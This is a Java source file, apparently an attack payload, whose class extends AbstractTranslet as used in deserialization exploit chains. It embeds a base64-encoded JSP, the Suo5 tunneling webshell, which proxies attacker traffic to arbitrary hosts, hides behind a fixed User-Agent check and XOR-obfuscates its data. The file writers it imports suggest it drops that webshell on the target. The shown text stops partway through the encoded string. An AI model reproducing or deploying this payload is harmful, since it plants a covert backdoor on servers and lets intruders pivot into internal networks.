package com.example.frchannel.payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;

public class suo5jsp extends AbstractTranslet {

    private static String suo5jsp = "PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLm5pby5CeXRlQnVmZmVyIiAlPjwlQCBwYWdlIGltcG9ydD0iamF2YS5pby4qIiAlPjwlQCBwYWdlIGltcG9ydD0iamF2YS5uZXQuKiIgJT48JUAgcGFnZSBpbXBvcnQ9ImphdmEuc2VjdXJpdHkuY2VydC5YNTA5Q2VydGlmaWNhdGUiICU+PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnNlY3VyaXR5LmNlcnQuQ2VydGlmaWNhdGVFeGNlcHRpb24iICU+PCVAIHBhZ2UgaW1wb3J0PSJqYXZheC5uZXQuc3NsLioiICU+PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKiIgJT48JSEKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgU3VvNSBpbXBsZW1lbnRzIFJ1bm5hYmxlLCBIb3N0bmFtZVZlcmlmaWVyLCBYNTA5VHJ1c3RNYW5hZ2VyIHsKICAgICAgICBwdWJsaWMgc3RhdGljIEhhc2hNYXAgYWRkcnMgPSBjb2xsZWN0QWRkcigpOwogICAgICAgIHB1YmxpYyBzdGF0aWMgSGFzaE1hcCBjdHggPSBuZXcgSGFzaE1hcCgpOwoKICAgICAgICBJbnB1dFN0cmVhbSBnSW5TdHJlYW07CiAgICAgICAgT3V0cHV0U3RyZWFtIGdPdXRTdHJlYW07CgogICAgICAgIHB1YmxpYyBTdW81KCkgewogICAgICAgIH0KCiAgICAgICAgcHVibGljIFN1bzUoSW5wdXRTdHJlYW0gaW4sIE91dHB1dFN0cmVhbSBvdXQpIHsKICAgICAgICAgICAgdGhpcy5nSW5TdHJlYW0gPSBpbjsKICAgICAgICAgICAgdGhpcy5nT3V0U3RyZWFtID0gb3V0OwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHZvaWQgcHJvY2VzcyhTZXJ2bGV0UmVxdWVzdCBzUmVxLCBTZXJ2bGV0UmVzcG9uc2Ugc1Jlc3ApIHsKICAgICAgICAgICAgSHR0cFNlcnZsZXRSZXF1ZXN0IHJlcXVlc3QgPSAoSHR0cFNlcnZsZXRSZXF1ZXN0KSBzUmVxOwogICAgICAgICAgICBIdHRwU2VydmxldFJlc3BvbnNlIHJlc3BvbnNlID0gKEh0dHBTZXJ2bGV0UmVzcG9uc2UpIHNSZXNwOwogICAgICAgICAgICBTdHJpbmcgYWdlbnQgPSByZXF1ZXN0LmdldEhlYWRlcigiVXNlci1BZ2VudCIpOwogICAgICAgICAgICBTdHJpbmcgY29udGVudFR5cGUgPSByZXF1ZXN0LmdldEhlYWRlcigiQ29udGVudC1UeXBlIik7CgogICAgICAgICAgICBpZiAoYWdlbnQgPT0gbnVsbCB8fCAhYWdlbnQuZXF1YWxzKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wOyBOZXh1cyA1IEJ1aWxkL01SQTU4TikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4xLjIuMyIpKSB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGNvbnRlbnRUeXBlID09IG51bGwpIHsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmIChjb250ZW50VHlwZS5lcXVhbHMoImFwcGxpY2F0aW9uL3BsYWluIikpIHsKICAgICAgICAgICAgICAgICAgICB0cnlGdWxsRHVwbGV4KHJlcXVlc3QsIHJlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKGNvbnRlbnRUeXBlLmVxdWFscygiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIikpIHsKICAgICAgICAgICAgICAgICAgICBwcm9jZXNzRGF0YUJpbyhyZXF1ZXN0LCByZXNwb25zZSk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHByb2Nlc3NEYXRhVW5hcnkocmVxdWVzdCwgcmVzcG9uc2UpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgZSkgewovLyAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50ZigicHJvY2VzcyBkYXRhIGVycm9yICVzXG4iLCBlKTsKLy8gICAgICAgICAgICAgICAgZS5wcmludFN0YWNrVHJhY2UoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcHVibGljIHZvaWQgcmVhZEZ1bGwoSW5wdXRTdHJlYW0gaXMsIGJ5dGVbXSBiKSB0aHJvd3MgSU9FeGNlcHRpb24sIEludGVycnVwdGVkRXhjZXB0aW9uIHsKICAgICAgICAgICAgaW50IGJ1ZmZlck9mZnNldCA9IDA7CiAgICAgICAgICAgIHdoaWxlIChidWZmZXJPZmZzZXQgPCBiLmxlbmd0aCkgewogICAgICAgICAgICAgICAgaW50IHJlYWRMZW5ndGggPSBiLmxlbmd0aCAtIGJ1ZmZlck9mZnNldDsKICAgICAgICAgICAgICAgIGludCByZWFkUmVzdWx0ID0gaXMucmVhZChiLCBidWZmZXJPZmZzZXQsIHJlYWRMZW5ndGgpOwogICAgICAgICAgICAgICAgaWYgKHJlYWRSZXN1bHQgPT0gLTEpIGJyZWFrOwogICAgICAgICAgICAgICAgYnVmZmVyT2Zmc2V0ICs9IHJlYWRSZXN1bHQ7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHB1YmxpYyB2b2lkIHRyeUZ1bGxEdXBsZXgoSHR0cFNlcnZsZXRSZXF1ZXN0IHJlcXVlc3QsIEh0dHBTZXJ2bGV0UmVzcG9uc2UgcmVzcG9uc2UpIHRocm93cyBJT0V4Y2VwdGlvbiwgSW50ZXJydXB0ZWRFeGNlcHRpb24gewogICAgICAgICAgICBJbnB1dFN0cmVhbSBpbiA9IHJlcXVlc3QuZ2V0SW5wdXRTdHJlYW0oKTsKICAgICAgICAgICAgYnl0ZVtdIGRhdGEgPSBuZXcgYnl0ZVszMl07CiAgICAgICAgICAgIHJlYWRGdWxsKGluLCBkYXRhKTsKICAgICAgICAgICAgT3V0cHV0U3RyZWFtIG91dCA9IHJlc3BvbnNlLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgICAgICBvdXQud3JpdGUoZGF0YSk7CiAgICAgICAgICAgIG91dC5mbHVzaCgpOwogICAgICAgIH0KCgogICAgICAgIHByaXZhdGUgSGFzaE1hcCBuZXdDcmVhdGUoYnl0ZSBzKSB7CiAgICAgICAgICAgIEhhc2hNYXAgbSA9IG5ldyBIYXNoTWFwKCk7CiAgICAgICAgICAgIG0ucHV0KCJhYyIsIG5ldyBieXRlW117MHgwNH0pOwogICAgICAgICAgICBtLnB1dCgicyIsIG5ldyBieXRlW117c30pOwogICAgICAgICAgICByZXR1cm4gbTsKICAgICAgICB9CgogICAgICAgIHByaXZhdGUgSGFzaE1hcCBuZXdEYXRhKGJ5dGVbXSBkYXRhKSB7CiAgICAgICAgICAgIEhhc2hNYXAgbSA9IG5ldyBIYXNoTWFwKCk7CiAgICAgICAgICAgIG0ucHV0KCJhYyIsIG5ldyBieXRlW117MHgwMX0pOwogICAgICAgICAgICBtLnB1dCgiZHQiLCBkYXRhKTsKICAgICAgICAgICAgcmV0dXJuIG07CiAgICAgICAgfQoKICAgICAgICBwcml2YXRlIEhhc2hNYXAgbmV3RGVsKCkgewogICAgICAgICAgICBIYXNoTWFwIG0gPSBuZXcgSGFzaE1hcCgpOwogICAgICAgICAgICBtLnB1dCgiYWMiLCBuZXcgYnl0ZVtdezB4MDJ9KTsKICAgICAgICAgICAgcmV0dXJuIG07CiAgICAgICAgfQoKICAgICAgICBwcml2YXRlIEhhc2hNYXAgbmV3U3RhdHVzKGJ5dGUgYikgewogICAgICAgICAgICBIYXNoTWFwIG0gPSBuZXcgSGFzaE1hcCgpOwogICAgICAgICAgICBtLnB1dCgicyIsIG5ldyBieXRlW117Yn0pOwogICAgICAgICAgICByZXR1cm4gbTsKICAgICAgICB9CgogICAgICAgIGJ5dGVbXSB1MzJ0b0J5dGVzKGludCBpKSB7CiAgICAgICAgICAgIGJ5dGVbXSByZXN1bHQgPSBuZXcgYnl0ZVs0XTsKICAgICAgICAgICAgcmVzdWx0WzBdID0gKGJ5dGUpIChpID4+IDI0KTsKICAgICAgICAgICAgcmVzdWx0WzFdID0gKGJ5dGUpIChpID4+IDE2KTsKICAgICAgICAgICAgcmVzdWx0WzJdID0gKGJ5dGUpIChpID4+IDgpOwogICAgICAgICAgICByZXN1bHRbM10gPSAoYnl0ZSkgKGkgLyo+PiAwKi8pOwogICAgICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgICAgIH0KCiAgICAgICAgaW50IGJ5dGVzVG9VMzIoYnl0ZVtdIGJ5dGVzKSB7CiAgICAgICAgICAgIHJldHVybiAoKGJ5dGVzWzBdICYgMHhGRikgPDwgMjQpIHwKICAgICAgICAgICAgICAgICAgICAoKGJ5dGVzWzFdICYgMHhGRikgPDwgMTYpIHwKICAgICAgICAgICAgICAgICAgICAoKGJ5dGVzWzJdICYgMHhGRikgPDwgOCkgfAogICAgICAgICAgICAgICAgICAgICgoYnl0ZXNbM10gJiAweEZGKSA8PCAwKTsKICAgICAgICB9CgogICAgICAgIHN5bmNocm9uaXplZCB2b2lkIHB1dChTdHJpbmcgaywgT2JqZWN0IHYpIHsKICAgICAgICAgICAgY3R4LnB1dChrLCB2KTsKICAgICAgICB9CgogICAgICAgIHN5bmNocm9uaXplZCBPYmplY3QgZ2V0KFN0cmluZyBrKSB7CiAgICAgICAgICAgIHJldHVybiBjdHguZ2V0KGspOwogICAgICAgIH0KCiAgICAgICAgc3luY2hyb25pemVkIE9iamVjdCByZW1vdmUoU3RyaW5nIGspIHsKICAgICAgICAgICAgcmV0dXJuIGN0eC5yZW1vdmUoayk7CiAgICAgICAgfQoKICAgICAgICBieXRlW10gY29weU9mUmFuZ2UoYnl0ZVtdIG9yaWdpbmFsLCBpbnQgZnJvbSwgaW50IHRvKSB7CiAgICAgICAgICAgIGludCBuZXdMZW5ndGggPSB0byAtIGZyb207CiAgICAgICAgICAgIGlmIChuZXdMZW5ndGggPCAwKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgSWxsZWdhbEFyZ3VtZW50RXhjZXB0aW9uKGZyb20gKyAiID4gIiArIHRvKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBieXRlW10gY29weSA9IG5ldyBieXRlW25ld0xlbmd0aF07CiAgICAgICAgICAgIGludCBjb3B5TGVuZ3RoID0gTWF0aC5taW4ob3JpZ2luYWwubGVuZ3RoIC0gZnJvbSwgbmV3TGVuZ3RoKTsKICAgICAgICAgICAgLy8gY2FuJ3QgdXNlIFN5c3RlbS5hcnJheWNvcHkgb2YgQXJyYXlzLmNvcHlPZiwgdGhlcmUgaXMgbm8gc3lzdGVtIGluIHNvbWUgZW52aXJvbm1lbnQKICAgICAgICAgICAgLy8gU3lzdGVtLmFycmF5Y29weShvcmlnaW5hbCwgZnJvbSwgY29weSwgMCwgIGNvcHlMZW5ndGgpOwogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGNvcHlMZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgY29weVtpXSA9IG9yaWdpbmFsW2Zyb20gKyBpXTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gY29weTsKICAgICAgICB9CgoKICAgICAgICBwcml2YXRlIGJ5dGVbXSBtYXJzaGFsKEhhc2hNYXAgbSkgdGhyb3dzIElPRXhjZXB0aW9uIHsKICAgICAgICAgICAgQnl0ZUFycmF5T3V0cHV0U3RyZWFtIGJ1ZiA9IG5ldyBCeXRlQXJyYXlPdXRwdXRTdHJlYW0oKTsKICAgICAgICAgICAgT2JqZWN0W10ga2V5cyA9IG0ua2V5U2V0KCkudG9BcnJheSgpOwogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGtleXMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgIFN0cmluZyBrZXkgPSAoU3RyaW5nKSBrZXlzW2ldOwogICAgICAgICAgICAgICAgYnl0ZVtdIHZhbHVlID0gKGJ5dGVbXSkgbS5nZXQoa2V5KTsKICAgICAgICAgICAgICAgIGJ1Zi53cml0ZSgoYnl0ZSkga2V5Lmxlbmd0aCgpKTsKICAgICAgICAgICAgICAgIGJ1Zi53cml0ZShrZXkuZ2V0Qnl0ZXMoKSk7CiAgICAgICAgICAgICAgICBidWYud3JpdGUodTMydG9CeXRlcyh2YWx1ZS5sZW5ndGgpKTsKICAgICAgICAgICAgICAgIGJ1Zi53cml0ZSh2YWx1ZSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGJ5dGVbXSBkYXRhID0gYnVmLnRvQnl0ZUFycmF5KCk7CiAgICAgICAgICAgIEJ5dGVCdWZmZXIgZGJ1ZiA9IEJ5dGVCdWZmZXIuYWxsb2NhdGUoNSArIGRhdGEubGVuZ3RoKTsKICAgICAgICAgICAgZGJ1Zi5wdXRJbnQoZGF0YS5sZW5ndGgpOwogICAgICAgICAgICAvLyB4b3Iga2V5CiAgICAgICAgICAgIGJ5dGUga2V5ID0gKGJ5dGUpICgoTWF0aC5yYW5kb20oKSAqIDI1NSkgKyAxKTsKICAgICAgICAgICAgZGJ1Zi5wdXQoa2V5KTsKICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBkYXRhLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICBkYXRhW2ldID0gKGJ5dGUpIChkYXRhW2ldIF4ga2V5KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBkYnVmLnB1dChkYXRhKTsKICAgICAgICAgICAgcmV0dXJuIGRidWYuYXJyYXkoKTsKICAgICAgICB9CgogICAgICAgIHByaXZhdGUgSGFzaE1hcCB1bm1hcnNoYWwoSW5wdXRTdHJlYW0gaW4pIHRocm93cyBFeGNlcHRpb24gewogICAgICAgICAgICBieXRlW10gaGVhZGVyID0gbmV3IGJ5dGVbNCArIDFdOyAvLyBzaXplIGFuZCBkYXRhdHlwZQogICAgICAgICAgICByZWFkRnVsbChpbiwgaGVhZGVyKTsKICAgICAgICAgICAgLy8gcmVhZCBmdWxsCiAgICAgICAgICAgIEJ5dGVCdWZmZXIgYmIgPSBCeXRlQnVmZmVyLndyYXAoaGVhZGVyKTsKICAgICAgICAgICAgaW50IGxlbiA9IGJiLmdldEludCgpOwogICAgICAgICAgICBpbnQgeCA9IGJiLmdldCgpOwogICAgICAgICAgICBpZiAobGVuID4gMTAyNCAqIDEwMjQgKiAzMikgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IElPRXhjZXB0aW9uKCJpbnZhbGlkIGxlbiIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGJ5dGVbXSBicyA9IG5ldyBieXRlW2xlbl07CiAgICAgICAgICAgIHJlYWRGdWxsKGluLCBicyk7CiAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgYnMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgIGJzW2ldID0gKGJ5dGUpIChic1tpXSBeIHgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIEhhc2hNYXAgbSA9IG5ldyBIYXNoTWFwKCk7CiAgICAgICAgICAgIGJ5dGVbXSBidWY7CiAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgYnMubGVuZ3RoIC0gMTsgKSB7CiAgICAgICAgICAgICAgICBzaG9ydCBrTGVuID0gYnNbaV07CiAgICAgICAgICAgICAgICBpICs9IDE7CiAgICAgICAgICAgICAgICBpZiAoaSArIGtMZW4gPj0gYnMubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigia2V5IGxlbiBlcnJvciIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGtMZW4gPCAwKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigia2V5IGxlbiBlcnJvciIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnVmID0gY29weU9mUmFuZ2UoYnMsIGksIGkgKyBrTGVuKTsKICAgICAgICAgICAgICAgIFN0cmluZyBrZXkgPSBuZXcgU3RyaW5nKGJ1Zik7CiAgICAgICAgICAgICAgICBpICs9IGtMZW47CgogICAgICAgICAgICAgICAgaWYgKGkgKyA0ID49IGJzLmxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oInZhbHVlIGxlbiBlcnJvciIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnVmID0gY29weU9mUmFuZ2UoYnMsIGksIGkgKyA0KTsKICAgICAgICAgICAgICAgIGludCB2TGVuID0gYnl0ZXNUb1UzMihidWYpOwogICAgICAgICAgICAgICAgaSArPSA0OwogICAgICAgICAgICAgICAgaWYgKHZMZW4gPCAwKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigidmFsdWUgZXJyb3IiKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoaSArIHZMZW4gPiBicy5sZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCJ2YWx1ZSBlcnJvciIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnl0ZVtdIHZhbHVlID0gY29weU9mUmFuZ2UoYnMsIGksIGkgKyB2TGVuKTsKICAgICAgICAgICAgICAgIGkgKz0gdkxlbjsKCiAgICAgICAgICAgICAgICBtLnB1dChrZXksIHZhbHVlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gbTsKICAgICAgICB9CgogICAgICAgIHByaXZhdGUgdm9pZCBwcm9jZXNzRGF0YUJpbyhIdHRwU2VydmxldFJlcXVlc3QgcmVxdWVzdCwgSHR0cFNlcnZsZXRSZXNwb25zZSByZXNwKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICAgICAgZmluYWwgSW5wdXRTdHJlYW0gcmVxSW5wdXRTdHJlYW0gPSByZXF1ZXN0LmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgICAgIEhhc2hNYXAgZGF0YU1hcCA9IHVubWFyc2hhbChyZXFJbnB1dFN0cmVhbSk7CgogICAgICAgICAgICBieXRlW10gYWN0aW9uID0gKGJ5dGVbXSkgZGF0YU1hcC5nZXQoImFjIik7CiAgICAgICAgICAgIGlmIChhY3Rpb24ubGVuZ3RoICE9IDEgfHwgYWN0aW9uWzBdICE9IDB4MDApIHsKICAgICAgICAgICAgICAgIHJlc3Auc2V0U3RhdHVzKDQwMyk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmVzcC5zZXRCdWZmZXJTaXplKDUxMik7CiAgICAgICAgICAgIGZpbmFsIE91dHB1dFN0cmVhbSByZXNwT3V0U3RyZWFtID0gcmVzcC5nZXRPdXRwdXRTdHJlYW0oKTsKCiAgICAgICAgICAgIC8vIDB4MDAgY3JlYXRlIHNvY2tldAogICAgICAgICAgICByZXNwLnNldEhlYWRlcigiWC1BY2NlbC1CdWZmZXJpbmciLCAibm8iKTsKICAgICAgICAgICAgU29ja2V0IHNjOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgU3RyaW5nIGhvc3QgPSBuZXcgU3RyaW5nKChieXRlW10pIGRhdGFNYXAuZ2V0KCJoIikpOwogICAgICAgICAgICAgICAgaW50IHBvcnQgPSBJbnRlZ2VyLnBhcnNlSW50KG5ldyBTdHJpbmcoKGJ5dGVbXSkgZGF0YU1hcC5nZXQoInAiKSkpOwogICAgICAgICAgICAgICAgaWYgKHBvcnQgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIENhbm5vdCBjb252ZXJ0IEludGVnZXIgdG8gaW50CiAgICAgICAgICAgICAgICAgICAgICAgIHBvcnQgPSAoKEludGVnZXIpIHJlcXVlc3QuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImdldExvY2FsUG9ydCIsIG5ldyBDbGFzc1tde30pLmludm9rZShyZXF1ZXN0LCBuZXcgT2JqZWN0W117fSkpLmludFZhbHVlKCk7CiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcG9ydCA9ICgoSW50ZWdlcikgcmVxdWVzdC5nZXRDbGFzcygpLmdldE1ldGhvZCgiZ2V0U2VydmVyUG9ydCIsIG5ldyBDbGFzc1tde30pLmludm9rZShyZXF1ZXN0LCBuZXcgT2JqZWN0W117fSkpLmludFZhbHVlKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgc2MgPSBuZXcgU29ja2V0KCk7CiAgICAgICAgICAgICAgICBzYy5jb25uZWN0KG5ldyBJbmV0U29ja2V0QWRkcmVzcyhob3N0LCBwb3J0KSwgNTAwMCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICByZXNwT3V0U3RyZWFtLndyaXRlKG1hcnNoYWwobmV3U3RhdHVzKChieXRlKSAweDAxKSkpOwogICAgICAgICAgICAgICAgcmVzcE91dFN0cmVhbS5mbHVzaCgpOwogICAgICAgICAgICAgICAgcmVzcE91dFN0cmVhbS5jbG9zZSgpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXNwT3V0U3RyZWFtLndyaXRlKG1hcnNoYWwobmV3U3RhdHVzKChieXRlKSAweDAwKSkpOwogICAgICAgICAgICByZXNwT3V0U3RyZWFtLmZsdXNoKCk7CiAgICAgICAgICAgIHJlc3AuZmx1c2hCdWZmZXIoKTsKCiAgICAgICAgICAgIGZpbmFsIE91dHB1dFN0cmVhbSBzY091dFN0cmVhbSA9IHNjLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgICAgICBmaW5hbCBJbnB1dFN0cmVhbSBzY0luU3RyZWFtID0gc2MuZ2V0SW5wdXRTdHJlYW0oKTsKCiAgICAgICAgICAgIFRocmVhZCB0ID0gbnVsbDsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIFN1bzUgcCA9IG5ldyBTdW81KHNjSW5TdHJlYW0sIHJlc3BPdXRTdHJlYW0pOwogICAgICAgICAgICAgICAgdCA9IG5ldyBUaHJlYWQocCk7CiAgICAgICAgICAgICAgICB0LnN0YXJ0KCk7CiAgICAgICAgICAgICAgICByZWFkUmVxKHJlcUlucHV0U3RyZWFtLCBzY091dFN0cmVhbSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7Ci8vICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRmKCJwaXBlIGVycm9yLCAlc1xuIiwgZSk7CiAgICAgICAgICAgIH0gZmluYWxseSB7CiAgICAgICAgICAgICAgICBzYy5jbG9zZSgpOwogICAgICAgICAgICAgICAgcmVzcE91dFN0cmVhbS5jbG9zZSgpOwogICAgICAgICAgICAgICAgaWYgKHQgIT0gbnVsbCkgewogICAgICAgICAgICAgICAgICAgIHQuam9pbigpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBwcml2YXRlIHZvaWQgcmVhZFNvY2tldChJbnB1dFN0cmVhbSBpbnB1dFN0cmVhbSwgT3V0cHV0U3RyZWFtIG91dHB1dFN0cmVhbSwgYm9vbGVhbiBuZWVkTWFyc2hhbCkgdGhyb3dzIElPRXhjZXB0aW9uIHsKICAgICAgICAgICAgYnl0ZVtdIHJlYWRCdWYgPSBuZXcgYnl0ZVsxMDI0ICogOF07CiAgICAgICAgICAgIHdoaWxlICh0cnVlKSB7CiAgICAgICAgICAgICAgICBpbnQgbiA9IGlucHV0U3RyZWFtLnJlYWQocmVhZEJ1Zik7CiAgICAgICAgICAgICAgICBpZiAobiA8PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBieXRlW10gZGF0YVRtcCA9IGNvcHlPZlJhbmdlKHJlYWRCdWYsIDAsIDAgKyBuKTsKICAgICAgICAgICAgICAgIGlmIChuZWVkTWFyc2hhbCkgewogICAgICAgICAgICAgICAgICAgIGRhdGFUbXAgPSBtYXJzaGFsKG5ld0RhdGEoZGF0YVRtcCkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3V0cHV0U3RyZWFtLndyaXRlKGRhdGFUbXApOwogICAgICAgICAgICAgICAgb3V0cHV0U3RyZWFtLmZsdXNoKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHByaXZhdGUgdm9pZCByZWFkUmVxKElucHV0U3RyZWFtIGJ1ZklucHV0U3RyZWFtLCBPdXRwdXRTdHJlYW0gc29ja2V0T3V0U3RyZWFtKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICAgICAgd2hpbGUgKHRydWUpIHsKICAgICAgICAgICAgICAgIEhhc2hNYXAgZGF0YU1hcDsKICAgICAgICAgICAgICAgIGRhdGFNYXAgPSB1bm1hcnNoYWwoYnVmSW5wdXRTdHJlYW0pOwoKICAgICAgICAgICAgICAgIGJ5dGVbXSBhY3Rpb25zID0gKGJ5dGVbXSkgZGF0YU1hcC5nZXQoImFjIik7CiAgICAgICAgICAgICAgICBpZiAoYWN0aW9ucy5sZW5ndGggIT0gMSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJ5dGUgYWN0aW9uID0gYWN0aW9uc1swXTsKICAgICAgICAgICAgICAgIGlmIChhY3Rpb24gPT0gMHgwMikgewogICAgICAgICAgICAgICAgICAgIHNvY2tldE91dFN0cmVhbS5jbG9zZSgpOwogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoYWN0aW9uID09IDB4MDEpIHsKICAgICAgICAgICAgICAgICAgICBieXRlW10gZGF0YSA9IChieXRlW10pIGRhdGFNYXAuZ2V0KCJkdCIpOwogICAgICAgICAgICAgICAgICAgIGlmIChkYXRhLmxlbmd0aCAhPSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHNvY2tldE91dFN0cmVhbS53cml0ZShkYXRhKTsKICAgICAgICAgICAgICAgICAgICAgICAgc29ja2V0T3V0U3RyZWFtLmZsdXNoKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChhY3Rpb24gPT0gMHgwMykgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHByaXZhdGUgdm9pZCBwcm9jZXNzRGF0YVVuYXJ5KEh0dHBTZXJ2bGV0UmVxdWVzdCByZXF1ZXN0LCBIdHRwU2VydmxldFJlc3BvbnNlIHJlc3ApIHRocm93cwogICAgICAgICAgICAgICAgRXhjZXB0aW9uIHsKICAgICAgICAgICAgSW5wdXRTdHJlYW0gaXMgPSByZXF1ZXN0LmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgICAgIEJ1ZmZlcmVkSW5wdXRTdHJlYW0gcmVhZGVyID0gbmV3IEJ1ZmZlcmVkSW5wdXRTdHJlYW0oaXMpOwogICAgICAgICAgICBIYXNoTWFwIGRhdGFNYXA7CiAgICAgICAgICAgIGRhdGFNYXAgPSB1bm1hcnNoYWwocmVhZGVyKTsKCgogICAgICAgICAgICBTdHJpbmcgY2xpZW50SWQgPSBuZXcgU3RyaW5nKChieXRlW10pIGRhdGFNYXAuZ2V0KCJpZCIpKTsKICAgICAgICAgICAgYnl0ZVtdIGFjdGlvbnMgPSAoYnl0ZVtdKSBkYXRhTWFwLmdldCgiYWMiKTsKICAgICAgICAgICAgaWYgKGFjdGlvbnMubGVuZ3RoICE9IDEpIHsKICAgICAgICAgICAgICAgIHJlc3Auc2V0U3RhdHVzKDQwMyk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLyoKICAgICAgICAgICAgICAgIEFjdGlvbkNyZWF0ZSAgICBieXRlID0gMHgwMAogICAgICAgICAgICAgICAgQWN0aW9uRGF0YSAgICAgIGJ5dGUgPSAweDAxCiAgICAgICAgICAgICAgICBBY3Rpb25EZWxldGUgICAgYnl0ZSA9IDB4MDIKICAgICAgICAgI